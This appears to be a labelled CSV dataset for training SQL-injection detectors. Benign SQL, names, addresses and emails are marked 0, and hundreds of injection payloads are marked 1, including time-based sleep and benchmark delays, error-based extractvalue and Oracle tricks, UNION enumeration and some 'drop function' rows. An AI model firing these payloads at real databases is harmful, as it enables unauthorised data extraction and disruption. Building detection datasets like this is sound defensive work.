Query,Label
"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",1
"SELECT * FROM thrown WHERE wore BETWEEN ""selection"" AND    ""took""",0
"paso de la soledad, 130 10?f",0
bonfiglio cabanas,0
"admin"" or ""1""  =  ""1",1
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf",1
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%',0
yasna,0
clav6ria,0
SELECT column_name ( s )  FROM table2; SELECT City FROM Customers,0
eflujo,0
13061311w,0
1%' waitfor delay '0:0:5' and '%'  =  ',1
SELECT AVG ( seven ) FROM type,0
peda2te1ca,0
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'njge' like 'njge,1
"calle arenys de mar, 113,",0
"1"" where 5039  =  5039 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1'   )    )     )   rlike sleep  (  5  )  #,1
"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"calle prat de la riba, 73",0
"-7544""   )    )    union all select 3808,3808,3808,3808--",1
SELECT halfway ( s ) FROM spread INNER JOIN,0
"1'  )   where 2443  =  2443 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT Count ( * )  AS just,0
"   SELECT this, union, throat FROM hope WHERE replied  IS NULL",0
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1
"1'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"INSERT INTO tall ( oxygen, coach, term, discussion, lake, fall )  VALUES  ( 'married', 'comfortable'. surprise', 'summer', 'tune', 'suppose', 'skill' )  ",0
-7452' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'nmdq' like 'nmdq,1
SELECT applied ( s )  FROM suggest FULL OUTER JOIN,0
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like,0
SELECT * FROM boat WHERE service = 'chart'  AND  ( yourself = 'rapidly' OR wide = 'shout' ) ,0
"1""  )   as dgzf where 4834  =  4834",1
SELECT COUNT ( forest ) FROM visit,0
1'||  (  select 'eyiy' from dual where 8127  =  8127,1
-1711  )   where 9098  =  9098 order by 1#,1
"iif  (  2976  =  2976,1,1/0  )  ",1
soldani-godet@informex.ru,0
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'maln' like 'maln",1
"c/ bailen 8,",0
SELECT AVG ( six ) FROM join SELECT SUM ( attention ) ,0
DELETE FROM rhyme,0
50,0
jo,0
madhim,0
bellaguarda,0
"1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM origin ORDER BY winter DESC,0
"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1
zurueta olarte,0
-9690 union all select 7217#,1
"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",1
26133,0
SELECT * FROM ordinary WHERE although  BETWEEN 10 AND 20,0
6173,0
SELECT * FROM in WHERE behavior = 'heart' LIMIT 3,0
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'nets' like 'nets",1
SELECT AVG ( myself )  FROM phrase  SELECT SUM ( track ) ,0
SELECT AVG ( either ) FROM usual SELECT SUM ( effect ) ,0
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,0
SELECT TOP 50 PERCENT * FROM eventually,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c83dc379ef' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT Count ( * )  AS column,0
"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",1
" SELECT * FROM close ORDER BY bite ASC, heart DESC",0
SELECT AVG ( lying ) FROM be,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  +'",1
"-1917""  )   or 8571  =  8571--",1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1
"""  )  ;waitfor delay '0:0:__TIME__'--",1
46725,0
"  SELECT stop AS given, before AS [knowledge]  FROM train",0
SELECT teeth ( s ) FROM may INNER JOIN,0
SELECT Count ( * )  AS cutting,0
SELECT AVG ( perfectly ) FROM band,0
monopolizador,0
3041,0
"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,1
SELECT * FROM explain WHERE NOT this = 'blind'  AND NOT stranger = 'who',0
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",1
c/ atlantico 167,0
48825670m,0
"   SELECT hand, cheese+ ', ' + treated+ ' ' + plain+ ', ' + went AS create  FROM test",0
" SELECT column_name ( s )  FROM pleasant,farm",0
tornos,0
victoria,0
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1
"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT needle ( s )  FROM catch,0
"1""  )   where 5196  =  5196 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT TOP 3 * FROM say,0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,1
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20,0
2.27852E+15,0
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0
chuvalo@ppmanzanares.nc,0
"   SELECT Employees.sugar, COUNT ( Orders.secretID )  AS situationFROM    ( OrdersINNER JOIN thrown ON Orders.morningID  =  Employees.butID ) ",0
"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
" select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1
1  )   and   (  3020  =  3020  )  *6703,1
"-1844'  )   union all select 9572,9572,9572,9572#",1
"1"" where 8672  =  8672 union all select null,null#",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",1
"  SELECT STR_TO_DATE ( ""August,5,2017"", ""%M %e %Y"" ) ;",0
SELECT breathing ( s )  FROM blood UNION,0
1'||  (  select 'avxz' from dual where 7815  =  7815,1
"c/ rua mayor, 31, 1?e",0
""" or sleep  (  __TIME__  )  #",1
us,0
ddimo,0
"  SELECT PERIOD_DIFF ( 201710, 201703 ) ;",0
SELECT AVG ( pattern ) FROM way SELECT SUM ( distant ) ,0
"SELECT * FROM possibly WHERE drop BETWEEN ""earn"" AND    ""pencil""",0
neusy,0
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1
SELECT TOP 3 * FROM unknown,0
select   (  case when   (  3681  =  5989  )   then 3681 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1
"1%'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and '%'  =  '",1
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",1
SELECT * FROM had 3,0
6e0turer2,0
SELECT * FROM article WHERE lunch = 'upper',0
lugar grela 152 1?f,0
"1""  )   union all select null,null--",1
-8080'   )    )    order by 1#,1
1'||  (  select 'ydvg' from dual where 7108  =  7108,1
israel_piggot@joyclub.pe,0
sabiela,0
"calle profesor angel lacalle, s/n,",0
FROM  ( SELECT DISTINCT magnet FROM stone ) ,0
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",1
gina,0
"-7423 or make_set  (  9354  =  9354,7185  )  -- hprc",1
SELECT * FROM farm WHERE herself  BETWEEN 10 AND 20,0
en8og1da,0
"  SELECT wealthID AS ID, particularly AS brown FROM break",0
"1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
cinthia,0
"1""  )   where 9621  =  9621",1
"  SELECT aroundID AS ID, appearance AS aid FROM child",0
giralda,0
SELECT pride ( s ) FROM enjoy INNER JOIN,0
"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
DELETE FROM favorite WHERE tobacco = 'standard',0
caine@albeiteria.es,0
mayolas,0
"-1204'   )    )    union all select 3585,3585--",1
fauno,0
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
"  UPDATE bag SET pet =  'consonant', City =  'another' WHERE outer =  title",0
"   SELECT COUNT ( useful ) , express FROM merely BY tobacco",0
7395,0
4644,0
"1' where 4102  =  4102 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
1 where 9774  =  9774,1
SELECT * FROM pride WHERE NOT directly = 'thousand'  AND NOT instant = 'spread',0
"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",1
SELECT AVG ( environment ) FROM pole SELECT SUM ( list ) ,0
SELECT * FROM industry,0
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",1
select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,1
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,1
"  SELECT * FROM broad WHERE orange IN  ( 'coach', 'breakfast', 'respect' )  ",0
"1""   )    )    as uycc where 4364  =  4364 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
-4882' order by 1#,1
"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
end and   (  'hmtt' like 'hmtt,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih",1
"1'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
6053,0
burns40,0
"  SELECT richID AS ID, remain AS thumb FROM swimming",0
1'||  (  select 'ilkr' from dual where 9296  =  9296,1
5537,0
SELECT * FROM rush ORDER BY important,0
DELETE FROM catch WHERE could = 'win',0
"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",1
"-9629'   )    )     )   union all select 3077,3077,3077,3077#",1
spnola ballado,0
SELECT COUNT ( possible )  FROM once,0
perpi izurrieta,0
SELECT handle ( s ) FROM gold INNER JOIN,0
"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,1
"1  )   where 2741  =  2741 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1"" where 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
DELETE FROM shallow WHERE develop = 'listen',0
SELECT MIN ( hung )  AS shaking FROM breakfast,0
2a6in6rosa,0
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1
SELECT City FROM Suppliers  ORDER BY City;,0
"carretera ribas matama 160,",0
SELECT tears FROM people UNION SELECT aware FROM directly ORDER BY settle,0
76150645z,0
"-3822""   )    )    as dftp where 2817  =  2817 union all select 2817,2817,2817,2817,2817,2817#",1
SELECT Count ( * )  AS route,0
niel5,0
"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
FROM  ( SELECT DISTINCT struggle FROM church ) ,0
"  UPDATE call SET member =  'fifteen', City =  'roar' WHERE first =  spend",0
SELECT * FROM hope FETCH FIRST 3 ROWS ONLY,0
co85863o,0
"   SELECT warn, reach+ ', ' + firm+ ' ' + powerful+ ', ' + friendly AS ago  FROM attack",0
"  SELECT * FROM composed WHERE round IN  ( 'get', 'exact', 'customs' )  ",0
"1""  )   and 4760  =  2922",1
5.97528E+15,0
"segura 30,",0
"SELECT * FROM till WHERE garage BETWEEN ""unhappy"" AND    ""double""",0
SELECT AVG ( climb ) FROM lovely,0
"-7036%' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
" SELECT * FROM property ORDER BY characteristic ASC, sugar DESC",0
8.62453E+15,0
SELECT COUNT ( DISTINCT park )  FROM someone,0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'uqfs'  =  'uqfs,1
"   SELECT weather, which, runFROM cowboy WHERE idea  IS NOT NULL",0
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
dinelli@alcantarapartners.mt,0
" SELECT * FROM along ORDER BY available, so",0
milton@diagnosticoradiologico.asia,0
if  (  4907  =  9581  )   select 4907 else drop function apqw--,1
nassiet.birkin@cienciapolicial.gl,0
"1""  )   where 7548  =  7548",1
"1"" where 2403  =  2403 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT say ( s )  FROM camera FULL OUTER JOIN,0
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1
SELECT * FROM lost FETCH FIRST 50 PERCENT ROWS ONLY,0
1'+  (  select 'iify' where 6257  =  6257 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',1
1.00217E+15,0
/,1
SELECT COUNT ( arrow ) FROM lunch,0
bacio bonnin,0
SELECT * FROM cent WHERE    NOT bound = 'memory',0
SELECT TAN ( 1.75 ) ;,0
SELECT * FROM feature WHERE taste BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM basic WHERE please BETWEEN '1996-07-01' AND '1996-07-31',0
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'qgrt'  =  'qgrt",1
"1""   )    )    as swwb where 4244  =  4244",1
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
SELECT * FROM seldom WHERE NOT union = 'drove'  AND NOT window = 'liquid',0
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # eahg",1
SELECT CURTIME (  )  + 1;,0
SELECT AVG ( fort ) FROM interior,0
"1%""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""%""  =  """,1
SELECT * FROM hair WHERE Price NOT BETWEEN 10 AND 20,0
"1""   )    )    as qode where 2398  =  2398 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
1.86E+15,0
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'ugrk'  =  'ugrk,1
"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",1
breceda perdig,0
"  SELECT Orders.enginerID, Employees.necessary, Employees.mountain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.cameID ORDER BY Orders.everyoneID",0
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",1
SELECT AVG ( ants ) FROM go,0
propaganda,0
"1   )    )    union all select null,null,null,null,null,null#",1
1.13313E+15,0
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,1
if  (  6745  =  4078  )   select 6745 else drop function ytyt--,1
SELECT * FROM job FETCH FIRST 3 ROWS ONLY,0
"   SELECT region, difference+ ', ' + mighty+ ' ' + ago+ ', ' + brain AS angle  FROM identity",0
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""hxdd""  =  ""hxdd",1
38435,0
-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,1
"plaza san miguel 132,",0
"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
trastabilln,0
"   SELECT thy, think, paint FROM cast WHERE top  IS NULL",0
SELECT AVG ( pilot ) FROM larger,0
"-9014%'  )   union all select 4211,4211,4211,4211,4211,4211#",1
"   SELECT consonant, noted, spendFROM in WHERE public  IS NOT NULL",0
"-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --",1
-3059'  )   as jhbh where 4056  =  4056 or   (  3498  =  6965  )  *6965--,1
SELECT COUNT ( teach ) FROM pleasure,0
"   SELECT tip, half, drivingFROM physical WHERE usual  IS NOT NULL",0
rainmake,0
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'krvo' like 'krvo,1
x' or full_name like '%bob%,1
"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",1
89816761j,0
1'+  (  select 'upmd' where 3438  =  3438,1
reis,0
"1%""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM indicate WHERE establish = 'so'  OR gave = 'cheese',0
25330,0
SELECT * FROM important WHERE hour = 'increase' LIMIT 3,0
SELECT * FROM jar WHERE trail = 'structure' FETCH FIRST 3 ROWS ONLY,0
"1""  )   as rcnk where 1800  =  1800",1
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_houzez_verification_success' LIMIT 1,0
SELECT * FROM do  WHERE limited = onto,0
SELECT * FROM steep 3 SELECT * FROM dangerous,0
"select * from generate_series  (  1431,1431,case when   (  1431  =  7822  )   then 1 else 0 end  )   limit 1--",1
2.28251E+15,0
SELECT * FROM managed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM between,0
end and    (    (     (  'hwrs' like 'hwrs,1
calle laguna de pealara 171 12-e,0
kindra,0
SELECT avoid ( s )  FROM room LEFT JOIN,0
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",1
"  SELECT famousID AS ID, principle AS room FROM children",0
SELECT * FROM grow WHERE three LIKE '%require%',0
1 rlike   (  select   (  case when   (  6795  =  5898  )   then 1 else 0x28 end   )    )   -- xdkx,1
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",1
"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"carlos arniches 78,",0
if  (  2697  =  2008  )   select 2697 else drop function jcoo--,1
SELECT * FROM century ORDER BY tobacco DESC,0
"  SELECT * FROM follow WHERE elephant IN  ( 'solve', 'four', 'throat' )  ",0
select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --,1
